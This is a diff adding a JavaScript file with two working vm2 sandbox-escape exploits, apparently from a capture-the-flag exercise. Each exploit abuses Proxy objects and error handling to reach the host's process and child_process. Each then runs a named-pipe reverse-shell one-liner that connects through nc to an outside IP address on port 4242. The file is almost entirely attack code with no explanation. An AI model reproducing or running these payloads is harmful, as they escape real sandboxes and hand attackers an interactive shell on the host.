@@ -1,0 +1,48 @@
+const { VM } = require("vm2");
+const vm = new VM();
+
+const code = `
+  const err = new Error();
+  err.name = {
+    toString: new Proxy(() => "", {
+      apply(target, thiz, args) {
+        const process = args.constructor.constructor("return process")();
+        throw process.mainModule.require("child_process").execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.67 4242 >/tmp/f').toString();
+      },
+    }),
+  };
+  try {
+    err.stack;
+  } catch (stdout) {
+    stdout;
+  }
+`;
+
+console.log(vm.run(code));
+
+
+----------------------
+
+
+const {VM} = require("vm2");
+const vm = new VM();
+
+const code = `
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.148 4242 >/tmp/f'); // replace <command> with your OS command
+}`
+
+console.log(vm.run(code));
